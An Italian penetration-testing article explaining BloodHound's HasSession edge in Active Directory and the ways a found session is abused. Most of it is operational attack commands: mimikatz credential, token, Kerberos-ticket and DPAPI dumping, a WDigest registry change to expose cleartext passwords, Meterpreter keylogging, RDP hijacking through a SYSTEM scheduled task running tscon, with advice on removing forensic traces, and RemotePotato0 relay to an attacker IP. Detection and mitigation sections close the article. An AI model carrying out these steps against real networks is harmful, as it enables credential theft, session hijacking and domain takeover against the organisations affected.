---
title: 'HasSession BloodHound: enumerazione e abuso delle sessioni'
slug: has-session
description: 'HasSession BloodHound: scopri come enumerare sessioni con SharpHound e sfruttare token, credenziali e RDP, con detection e mitigazioni per Active Directory.'
image: /pth-net-has-session.webp
draft: false
date: 2026-07-21T00:00:00.000Z
categories:
  - web-hacking
subcategories:
  - privilege-escalation
tags:
  - HasSession
  - Token Impersonation
  - RDP Session Hijacking
---

# HasSession: cos'è, come si enumera e tutte le metodologie di abuso/privesc

**HasSession** è l'edge di [BloodHound](https://hackita.it/articoli/bloodhound/) rappresentato come `(Computer)-[:HasSession]->(User)`: indica che un utente ha (o aveva, al momento della raccolta) una sessione di logon su quel computer. Non è un privilegio da sfruttare direttamente — è un'informazione di **posizionamento**: dice dove andare a caccia se vuoi le credenziali o il token di un utente specifico, magari un Domain Admin. Da lì in poi le strade sono diverse: dump di credenziali, furto di token, keylogging, hijacking di sessione RDP, o attacchi di coercizione come RemotePotato0.

***

## Cos'è HasSession, con precisione

Schema ufficiale dell'edge:

```text
Source:      Computer
Destination: User
Traversable: sì
```

Quindi la lettura corretta del grafo è "questo **computer** ha (avuto) una sessione di **questo utente**" — non il contrario.

Punti chiave:

* **Non è solo "sessione interattiva".** SharpHound raccoglie le sessioni tramite chiamate come `NetWkstaUserEnum`, che può restituire logon interattivi, di servizio, batch, o utenti la cui identità è ancora "impersonata" da un servizio anche dopo il logoff apparente. `HasSession` è quindi un indizio di presenza/utilizzo dell'identità sul sistema, non la prova certa di una sessione RDP attiva con LSASS pieno di credenziali riutilizzabili.
* **Le sessioni sono effimere.** Rappresentano una foto del momento della raccolta — l'utente potrebbe essersi disconnesso nel frattempo. Ma gli utenti tendono a ripetere gli stessi pattern (stessa postazione, stesso server di salto), quindi vale la pena ricontrollare più volte.
* **Solo un amministratore locale della macchina** può recuperare materiale di autenticazione dalla memoria. Una sessione da sola, senza privilegi amministrativi sul computer target, non porta a nulla.

## Come SharpHound raccoglie le sessioni

Due metodi di raccolta distinti:

```cmd
:: Raccolta standard (NetWkstaUserEnum), non richiede privilegi speciali
SharpHound.exe --CollectionMethods Session

:: Metodo privilegiato — usalo se hai già admin locale su molte macchine: dati più completi
SharpHound.exe --CollectionMethods LoggedOn
```

Poiché le sessioni cambiano continuamente, una singola raccolta rischia di perdere il Domain Admin che si logga solo per pochi minuti al giorno. Per questo `--Loop` esiste apposta:

```cmd
SharpHound.exe --CollectionMethods Session --Loop --LoopDuration 03:00:00 --LoopInterval 00:15:00
```

Ripete la raccolta ogni 15 minuti per 3 ore, costruendo una mappa temporale molto più completa di quella che avresti con una singola passata.

## Query Cypher offensive

Una volta importati i dati in BloodHound, queste sono le query che trasformano l'enumerazione in un piano d'azione (sintassi indicativa, adatta i nomi property/etichette alla versione di BloodHound in uso):

**Dove hanno sessione i Domain Admin:**

```cypher
MATCH (u:User)-[:MemberOf*1..]->(g:Group)
WHERE g.name = 'DOMAIN ADMINS@HACKITA.LAB'
WITH u
MATCH p=(c:Computer)-[:HasSession]->(u)
RETURN p
```

**Dove ha sessione un utente specifico:**

```cypher
MATCH p=(c:Computer)-[:HasSession]->(u:User)
WHERE u.name = 'ADMIN.HACKITA@HACKITA.LAB'
RETURN p
```

**La query più operativa — sessioni interessanti su computer dove sei già admin:**

```cypher
MATCH p=(attacker:User {name:'OPERATORE@HACKITA.LAB'})-[:AdminTo]->(computer:Computer)-[:HasSession]->(target:User)
RETURN p
```

Questa terza query è la vera catena offensiva:

```text
Hai AdminTo sul computer
        |
        v
Sul computer esiste HasSession di un utente più privilegiato di te
        |
        v
Raggiungi l'host, verifichi che la sessione sia ancora valida (qwinsta/query user)
        |
        v
Scegli la tecnica giusta in base al logon type e ai privilegi che hai
        |
        v
Assumi la nuova identità
```

***

## Enumerazione manuale delle sessioni (in tempo reale, senza BloodHound)

### query session / qwinsta

```cmd
qwinsta /server:DC01
```

```text
SESSIONNAME       USERNAME                 ID  STATE   TYPE
console                                     0  conn
>rdp-tcp#3        admin.hackita             2  Active  rdpwd
                  svc_backup                3  Disc
```

`qwinsta` mostra le sessioni RDS/interattive su un host. Non richiede che il Remote Desktop sia abilitato per essere interrogato da remoto, ma per vedere le sessioni *di altri utenti* serve un permesso specifico ("Query Information"): non basta genericamente "la porta RPC raggiungibile", conta anche l'ACL sulla sessione stessa.

### query user

```cmd
query user /server:DC01
```

Variante più compatta, mostra utenti e stato (Active/Disc).

### net session — attenzione al verso

`net session` **non** interroga da remoto un altro host per sapere chi ci è loggato. Mostra le sessioni SMB stabilite **verso il server locale**; l'argomento `\\nomecomputer` filtra per mostrare solo la sessione proveniente da quel client specifico:

```cmd
net session \\DC01
```

Questo comando, lanciato su un server, significa "mostrami la sessione SMB proveniente dal client DC01" — non "interroga DC01 su chi è loggato lì". Da tenere distinti:

```text
NetWkstaUserEnum → chi è loggato sul computer che interroghi (usato da qwinsta/query user/SharpHound Session)
NetSessionEnum   → quali client sono connessi alle risorse SMB del server locale (net session)
```

### WMI / PowerShell

```powershell
Get-CimInstance Win32_LoggedOnUser -ComputerName DC01
```

Include anche dati "stale" (sessioni disconnesse) — incrocia sempre con `qwinsta` per lo stato reale.

### PsLoggedOn (Sysinternals)

```cmd
PsLoggedon.exe \\DC01
```

Combina sessioni locali/interattive e sessioni di rete. Attenzione: interrogare un sistema remoto con PsLoggedOn richiede l'accesso al registro remoto, che di per sé genera una nuova sessione — non stupirti se vedi comparire anche il tuo stesso account nell'output.

***

## Logon type: non tutte le sessioni lasciano lo stesso materiale

Prima di scegliere una tecnica, capisci con che tipo di logon hai a che fare — non tutte lasciano credenziali riutilizzabili:

| Logon type | Scenario                                             | Materiale riutilizzabile                                                  |
| ---------: | ---------------------------------------------------- | ------------------------------------------------------------------------- |
|          2 | Interattivo (console, RunAs senza /netonly)          | Generalmente sì                                                           |
|          3 | Rete (SMB, RPC, accesso a share)                     | Generalmente no                                                           |
|          4 | Batch (scheduled task)                               | Può essere presente                                                       |
|          5 | Servizio Windows                                     | Può essere presente                                                       |
|          9 | NewCredentials (`runas /netonly`)                    | Credenziali usate solo per connessioni in uscita, non per il logon locale |
|         10 | RemoteInteractive (RDP)                              | Generalmente sì                                                           |
|         11 | CachedInteractive (hash cache, DC non raggiungibile) | Dipende dalla configurazione                                              |

Questo spiega perché **un `HasSession` derivato da una sessione SMB (type 3) non equivale automaticamente a "posso estrarre credenziali riutilizzabili"** — quello richiede tipicamente un logon interattivo, RDP, batch o di servizio.

***

## Metodologie di abuso di una sessione trovata

### 1. Token impersonation

Se sei già amministratore locale sulla macchina dove l'utente ha sessione:

```cmd
mimikatz # privilege::debug
mimikatz # token::list
mimikatz # token::elevate /domainadmin
```

`token::elevate` cerca un token con privilegi di Domain Admin tra i processi attivi e lo impersona. Con Metasploit, l'equivalente è il modulo **Incognito** (`list_tokens -u` per elencare i token disponibili, `impersonate_token` per assumerne uno) — stessa logica, tool diverso, utile se stai già operando con un Meterpreter piuttosto che con mimikatz standalone. Questo è il passaggio che concretamente trasforma un `HasSession` trovato in [account takeover](https://hackita.it/articoli/account-takeover/) vero e proprio.

In alternativa, per estrarre direttamente le credenziali dalla memoria:

```cmd
mimikatz # sekurlsa::logonpasswords
```

funziona a patto che LSASS non sia protetto (PPL, Credential Guard) — vedi la sezione mitigazioni. Il risultato più prezioso qui è spesso proprio l'hash NTLM da riusare per [pass-the-hash](https://hackita.it/articoli/pass-the-hash/) su altri host.

**Trucco per forzare credenziali in chiaro:** se WDigest è abilitato (o lo abiliti tu con permessi di amministratore), Windows tiene in memoria la password in **chiaro**, non solo l'hash:

```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f
```

Dopo aver forzato il valore, serve che l'utente **si riautentichi** (nuovo logon, es. riconnessione RDP) perché il valore venga effettivamente popolato — a quel punto `sekurlsa::wdigest` mostra la password in chiaro, non solo l'hash. Da Windows 8.1/Server 2012 R2 in poi è disabilitato di default, quindi questa modifica lascia una traccia di registro facilmente rilevabile (vedi detection).

Da tenere a mente sui token: esistono **primary token** (associato al processo) e **impersonation token** (associato a un thread specifico), con livelli di integrità diversi e privilegi che possono essere presenti ma disabilitati. Un token può essere solo "impersonabile" localmente oppure anche "delegabile" verso altri host — la differenza conta se il tuo obiettivo è muoverti lateralmente e non solo agire localmente come quell'utente.

### 2. Keylogging e clipboard monitoring

Se non riesci a estrarre credenziali (LSASS protetto, EDR aggressivo) ma l'utente ha comunque una sessione attiva, puoi intercettare ciò che digita o copia — non serve toccare la memoria di LSASS, quindi è più silenzioso rispetto a un dump diretto.

**Keylogging (Meterpreter):**

```text
meterpreter > migrate <PID del processo dell'utente target>
meterpreter > keyscan_start
[*] Starting the keystroke sniffer...
```

Dopo un intervallo ragionevole (minuti/ore, dipende da quanto l'utente digita):

```text
meterpreter > keyscan_dump
[*] Dumping captured keystrokes...
admin.hackita<Return>P@ssw0rd2026!<Return>
```

Il `migrate` è importante: se resti nel tuo processo iniziale invece di migrare in uno del target, catturi solo la tua tastiera, non quella dell'utente.

**Clipboard monitoring (PowerSploit):**

```powershell
Invoke-ClipboardMonitor -Interval 5
```

Controlla il contenuto degli appunti ogni 5 secondi e lo registra — utile perché molte persone copiano e incollano le password da un password manager invece di digitarle, il che vanifica il keylogging puro ma non il monitoraggio appunti.

**Limite pratico:** entrambe le tecniche sono passive e richiedono tempo — non hai un risultato immediato come con un dump di LSASS. Vanno pianificate quando sai che l'utente tornerà a operare su quella sessione a breve (es. appena prima dell'orario di lavoro).

### 3. RDP session hijacking (tscon)

Requisiti reali del comando `tscon` (documentati da Microsoft): serve permesso **Full Control** o il diritto speciale **Connect** sulla sessione target, e la password del proprietario della sessione **a meno che** tu non sia già SYSTEM — è proprio l'esecuzione come SYSTEM (es. tramite scheduled task lanciato come SYSTEM, o `psexec -s`) che bypassa il controllo password, un comportamento documentato da Benjamin Delpy e Alexander Korznikov legato a come funziona lo session shadowing. Nota anche che non puoi collegarti direttamente alla console session con questo comando in condizioni normali.

**Workflow completo** (richiede di essere già amministratore locale, per creare uno scheduled task come SYSTEM):

```cmd
query user
```

```text
 USERNAME              SESSIONNAME       ID  STATE   IDLE TIME
 admin.hackita          rdp-tcp#3          2  Active     .
>hackita                console            1  Active
```

Ora crei uno scheduled task che esegue `tscon` come SYSTEM, per dirottare la sessione 2 (admin.hackita) sulla tua console (sessione 1):

```cmd
schtasks /create /sc onstart /tn "hijack" /tr "tscon 2 /dest:console" /ru "SYSTEM"
schtasks /run /tn "hijack"
```

Il task, eseguito come SYSTEM, chiama `tscon` senza dover fornire la password di `admin.hackita`. Al termine, la tua sessione console diventa quella dell'utente dirottato — senza mai aver visto una password, e senza aver toccato LSASS.

**Pulizia:** rimuovi lo scheduled task dopo l'uso (`schtasks /delete /tn "hijack" /f`) — un task con quel comando resta un artefatto forense evidente se lasciato.

**Differenza importante con `tscon`:** con `tscon` la sessione originale viene disconnessa e "rubata" — l'utente la ritrova sparita al prossimo accesso. Con `mstsc /shadow` invece la sessione dell'utente **resta attiva** mentre tu la osservi o la controlli in parallelo — più adatto quando vuoi restare silenzioso e osservare, non rubare l'accesso. Questo tecnicamente rientra nella categoria MITRE ATT\&CK T1563 — Remote Service Session Hijacking.

### 4. RDP shadowing nativo (mstsc /shadow) — alternativa senza rubare la sessione

Windows include dal 2012 R2 una funzione di shadowing RDS nativa, pensata per il supporto tecnico ma altrettanto utile offensivamente. A differenza di `tscon`, qui la sessione dell'utente **resta viva** — tu ti affianchi, non la disconnetti:

```cmd
qwinsta
mstsc /shadow:<ID_sessione> /control
```

`/control` ti dà anche mouse e tastiera, non solo la vista. Serve essere amministratore, e per default l'utente **riceve un prompt di consenso** — ma se sull'host è impostata la GPO "Set rules for remote control of Remote Desktop Services user sessions" con l'opzione senza consenso, lo shadowing avviene silenziosamente, senza che l'utente se ne accorga.

### 5. Kerberos ticket theft (Pass-the-Ticket)

Una sessione può esporre anche materiale Kerberos, non solo hash NTLM: TGT dell'utente, service ticket (TGS), chiavi AES/RC4 presenti nella sessione LSA. Con [mimikatz](https://hackita.it/articoli/mimikatz/):

```cmd
mimikatz # sekurlsa::tickets /export
```

I ticket esportati possono essere reiniettati su un'altra sessione (Pass-the-Ticket) per muoversi lateralmente senza mai toccare hash o password — utile in particolare quando l'account target ha delega Kerberos configurata.

### 6. DPAPI e segreti del profilo utente

Anche quando LSASS è protetto, il profilo caricato dell'utente può contenere Credential Manager, certificati, credenziali applicative protette con DPAPI. Workflow concreto con mimikatz:

**Step 1 — trova la masterkey dell'utente (dalla memoria, se hai una sessione attiva):**

```cmd
mimikatz # sekurlsa::dpapi
```

```text
[00000000] Guid   : {5d4e7e0d-d922-4783-8efc-9319b45b1c9a}
    MasterKey  : 0a942e9dfc934246081ed23f371c42fc0f9fcb6dcd3285ac2...
    sha1(key)  : ba02ef86f26c683858d3df3dc961e37b0d47e574
```

**Step 2 — decifra il file di credenziali salvato (es. una password di scheduled task):**

```cmd
mimikatz # dpapi::cred /in:"C:\Users\admin.hackita\AppData\Local\Microsoft\Credentials\AA10EB8126AA20883E9542812A0F904C" /masterkey:0a942e9dfc934246081ed23f371c42fc0f9fcb6dcd3285ac2...
```

```text
**CREDENTIAL**
  UserName     : HACKITA\svc_backup
  CredentialBlob : B4ckupP@ss2026!
```

Se non hai la masterkey in memoria (sessione già chiusa, ma hai comunque accesso al filesystem/registro dell'utente come admin locale), puoi recuperarla offline dal file su disco:

```cmd
mimikatz # dpapi::masterkey /in:"C:\Users\admin.hackita\AppData\Roaming\Microsoft\Protect\S-1-5-21-...\5d4e7e0d-d922-4783-8efc-9319b45b1c9a" /rpc
```

Questo è il motivo per cui una sessione **anche vecchia** (non più attiva ora) può comunque valere qualcosa: se hai accesso al profilo su disco, non serve che l'utente sia ancora loggato.

**Le password di Credential Manager** (quelle salvate per condivisioni di rete, RDP, applicazioni) si recuperano in modo simile con `vault::cred` (se hai già un token dell'utente elevato) o `dpapi::vault` (offline, con masterkey nota).

### 7. SessionGopher — sessioni salvate di altri strumenti

Diversa da tutte le precedenti: non serve che l'utente abbia una sessione **attiva ora**, basta che l'abbia mai avuta su quella macchina. SessionGopher interroga l'hive `HKEY_USERS` per ogni profilo utente presente e recupera sessioni salvate di PuTTY, WinSCP, SuperPuTTY, FileZilla e Remote Desktop — decifrando automaticamente le password salvate di WinSCP/FileZilla/SuperPuTTY.

```powershell
Import-Module .\SessionGopher.ps1
Invoke-SessionGopher -Target DC01
```

In modalità `-Thorough` cerca anche su tutti i dischi file `.ppk` (chiavi private PuTTY), `.rdp` e `.sdtid` (token RSA):

```powershell
Invoke-SessionGopher -Target DC01 -Thorough
```

Per una scansione ad ampio raggio su tutto il dominio:

```powershell
Invoke-SessionGopher -AllDomain -o output.csv
```

Con privilegi admin locale ottieni i dati di **tutti** gli utenti che si sono mai loggati; senza, solo i tuoi. Particolarmente utile per scovare credenziali verso jump box, sistemi Unix o terminali POS che l'utente amministra abitualmente da quella macchina.

### 8. Sessioni di servizio (Type 4/5) — spesso ignorate

Una sessione di un account di servizio può essere più stabile di quella di un amministratore umano, ed esporre: ticket Kerberos di lunga durata, accesso a database, share di backup, sistemi di deployment, delega Kerberos configurata sull'account.

Esempio concreto: trovi `HasSession` di `svc_sql` su un application server. Non è un utente umano, ma:

```cmd
mimikatz # sekurlsa::logonpasswords
```

su un account di servizio spesso restituisce credenziali **valide e stabili** (l'account non cambia password spesso quanto un utente umano, e la sessione resta viva quanto il servizio gira). Se poi controlli i privilegi di quell'account:

```powershell
Get-ADUser svc_sql -Properties memberof, servicePrincipalName, msDS-AllowedToDelegateTo
```

Un account di servizio con `msDS-AllowedToDelegateTo` popolato ha **delega Kerberos configurata** — puoi potenzialmente impersonare altri utenti verso il servizio a cui delega, un salto di privilegio spesso più silenzioso che colpire direttamente un umano (le sessioni di servizio generano meno rumore comportamentale, essendo automatizzate e prevedibili).

### 9. Coercizione mirata a una sessione: RemotePotato0

RemotePotato0 non si limita a enumerare una sessione, la **usa attivamente**: sfrutta il servizio di attivazione DCOM per forzare un utente con sessione interattiva sulla stessa macchina (tipicamente un Domain Admin in sessione 1, mentre l'attaccante opera da un'altra sessione) ad autenticarsi verso un server RPC/OXID controllato dall'attaccante.

**Attenzione a non confonderlo con la famiglia "Potato" classica** ([RottenPotato, JuicyPotato, PrintSpoofer, RoguePotato](https://hackita.it/articoli/seimpersonateprivilege/)): quelle sfruttano `SeImpersonatePrivilege` per ottenere SYSTEM coercendo un'autenticazione da un **servizio** locale (BITS, Print Spooler), senza bisogno che nessun altro utente sia loggato. RemotePotato0 invece è specificamente **session-based**: non ti serve SYSTEM come obiettivo, ti serve che un utente privilegiato specifico abbia sessione attiva sulla stessa macchina — è proprio per questo che rientra in un articolo su HasSession e gli altri no.

Il tool ha **due modalità distinte**, da non confondere:

**Solo cattura hash (nessun relay verso terzi):**

```cmd
.\RemotePotato0.exe -m 2 -s 1 -x <IP_ATTACCANTE> -p 8885
```

* `-m 2` — modalità "Rpc capture (hash) server + potato trigger": ruba direttamente l'hash NTLMv2 dell'utente target, senza rilanciarlo altrove
* `-s 1` — sessione da colpire (tipicamente la 1, dove spesso è loggato un utente interattivo/privilegiato, a differenza della sessione 0 riservata ai servizi)
* `-x`/`-p` — IP e porta del Rogue OXID Resolver, necessari quando serve un redirector di rete esterno (Windows Server > 2016)

**Catena completa di relay cross-protocollo (RPC → HTTP → LDAP/altro target):**

```cmd
.\RemotePotato0.exe -m 0 -r <IP_ATTACCANTE> -x <IP_ATTACCANTE> -p 9999 -s 1
```

* `-m 0` — modalità di default: relay cross-protocollo + trigger, non solo cattura
* `-r` — IP del relay server HTTP remoto (dove l'autenticazione catturata viene effettivamente rilanciata, es. verso `ntlmrelayx.py -t ldap://<DC>`)

Su Windows Server ≤ 2016 l'OXID resolution può avvenire in locale, senza redirector esterno. Su versioni più recenti serve inoltrare la porta 135:

```bash
sudo socat -v TCP-LISTEN:135,fork,reuseaddr TCP:<IP_MACCHINA_TARGET>:9999
```

**Prerequisito fondamentale:** entrambe le modalità richiedono che sulla stessa macchina sia effettivamente loggato in sessione interattiva un utente con privilegi interessanti — è esattamente l'informazione che `qwinsta`/`HasSession` fornisce prima ancora di lanciare l'exploit.

**Nota storica importante:** Microsoft ha corretto (21 ottobre 2022) lo scenario di sfruttamento principale RPC→LDAP usato da RemotePotato0. Su ambienti aggiornati e con LDAP signing/channel binding correttamente configurati, aspettati che il modulo 0/1 (relay verso LDAP) non funzioni più — considera la tecnica principalmente storica o valida in laboratori/ambienti non patchati, mentre la sola cattura hash (`-m 2`) resta utilizzabile più a lungo.

***

## Decision tree operativa

Una volta trovato un `HasSession`, questa è la logica per scegliere la tecnica giusta senza sprecare tempo — la stessa struttura che vale per qualsiasi [privilege escalation su Windows](https://hackita.it/articoli/windows-privilege-escalation/) partendo da un punto d'appoggio:

```text
Trovo HasSession
        |
        +-- Non controllo il computer
        |       -> cerco AdminTo, CanRDP, CanPSRemote, o un altro percorso verso quell'host
        |
        +-- Sono amministratore locale
        |       -> verifico processi e token attivi
        |       -> verifico se LSASS è protetto (PPL/Credential Guard)
        |       -> cerco ticket Kerberos esportabili
        |       -> controllo segreti DPAPI/Credential Manager nel profilo
        |
        +-- Sono SYSTEM
        |       -> token impersonation cross-session
        |       -> RDP session hijacking con tscon
        |       -> coercizione cross-session (RemotePotato0)
        |
        +-- La sessione è solo Network Type 3
                -> probabilmente nessun hash/TGT riutilizzabile, valuta altre strade
```

## RDP normale vs Restricted Admin vs Remote Credential Guard

Non tutte le connessioni RDP lasciano lo stesso materiale sul target:

* **RDP normale**: le credenziali dell'utente (o materiale derivato) possono restare esposte sull'host di destinazione
* **Restricted Admin mode**: non invia le credenziali complete dell'utente al target — riduce cosa un attaccante con admin locale sul target può recuperare
* **Remote Credential Guard**: mantiene le credenziali fuori dall'host remoto, reindirizzando le richieste Kerberos al client di origine

Un `HasSession` generato da una connessione RDP quindi **non implica sempre** che l'NT hash o il TGT siano effettivamente estraibili — dipende da quale di queste modalità era in uso.

***

## Detection

| Event ID | Significato                                                                                                                                             |
| -------- | ------------------------------------------------------------------------------------------------------------------------------------------------------- |
| 4624     | Logon riuscito — controlla il Logon Type (2/4/5/9/10 su un host non abituale per quell'account è il segnale)                                            |
| 4634     | Fine sessione (logoff completo o disconnessione, anche non intenzionale)                                                                                |
| 4647     | Logoff avviato esplicitamente dall'utente                                                                                                               |
| 4779     | Sessione disconnessa da una Window Station — tipico di una disconnessione RDP senza logoff completo, utile per distinguere "disconnesso" da "terminato" |

Oltre agli event ID, monitora:

* Esecuzione di `tscon.exe` fuori da contesti amministrativi pianificati
* Accessi a `lsass.exe` (Event ID 4656/4663, o alert EDR su lettura di memoria di processo)
* Attività DCOM anomale: attivazione di CLSID insoliti da processi non amministrativi
* Traffico RPC sulla porta 135 verso IP esterni alla subnet gestionale (indicatore di redirector tipo `socat`)
* Correlazione temporale tra un accesso amministrativo locale su un host e l'uso successivo dell'identità di un account privilegiato altrove

## Mitigazioni

* **LSA Protection (RunAsPPL)** ostacola l'injection e il memory dumping su LSASS
* **Credential Guard** isola hash NTLM e ticket Kerberos tramite virtualization-based security
* **Remote Credential Guard** evita che le credenziali RDP restino esposte sul target
* Workstation amministrative dedicate (PAW) per gli account Tier 0, con divieto di logon su host non affidabili
* Segmentazione: gli account privilegiati non dovrebbero mai avere sessioni su workstation utente standard

## FAQ

**HasSession è di per sé sfruttabile?**
No. È un'informazione di posizionamento: dice dove cercare, non dà accesso da solo. Serve sempre un privilegio aggiuntivo (admin locale, SYSTEM, o un attacco di coercizione) per trasformarlo in credenziali o accesso reale.

**Una sessione trovata con BloodHound è ancora valida quando arrivo sulla macchina?**
Non è garantito — verifica sempre con `qwinsta`/`query user` in tempo reale prima di investire tempo in un attacco basato su quella sessione.

**Perché RemotePotato0 richiede la sessione 1 e non la sessione 0?**
Perché la sessione 0 è riservata a servizi/processi di sistema, mentre gli utenti interattivi (RDP, accesso console) si trovano in sessioni successive.

**Un HasSession derivato da una connessione SMB vale quanto uno da RDP?**
No — corrisponde tipicamente a un logon Type 3 (rete), che generalmente non lascia credenziali riutilizzabili sul sistema, a differenza di un logon interattivo/RDP (Type 2/10).

***

## Conclusione

HasSession è uno degli edge più sottovalutati di BloodHound proprio perché non è un privilegio in senso stretto — ma è spesso il primo passo che trasforma "ho compromesso un host qualsiasi" in "so esattamente dove trovare le credenziali di un Domain Admin". La parte che conta davvero non è la singola tecnica, ma la catena: raccolta della sessione → verifica che sia ancora valida → identificazione del logon type → scelta della tecnica coerente con i privilegi che hai su quell'host.

Per approfondire: **[SpecterOps — HasSession edge documentation](https://bloodhound.specterops.io/resources/edges/has-session)**.
